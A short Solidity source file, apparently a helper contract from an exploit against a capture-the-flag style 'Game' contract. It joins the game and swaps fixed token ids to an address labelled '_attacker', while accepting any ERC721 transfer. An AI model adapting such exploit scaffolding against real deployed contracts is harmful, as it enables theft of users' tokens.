pragma solidity 0.8.12;




interface Game {

    function join() external returns (uint256[3] memory);
    function putUpForSale(uint256 _monId) external;
    function fight() external;
    function balanceOf(address owner) external returns (uint256);
    function swap(address _to, uint256 _monId1, uint256 _monId2) external;
}

contract Helper {


    address public game;
    

    constructor(address _game) {

        game = _game;
       
    }

    function helperJoin() external {
        Game(game).join();
    }
    function swap1(address _attacker) external {

        Game(game).swap(_attacker,9,12);
    }

    function onERC721Received(address operator,address from,uint256 tokenId,bytes calldata data) external returns (bytes4){


return 0x150b7a02;
    }
}
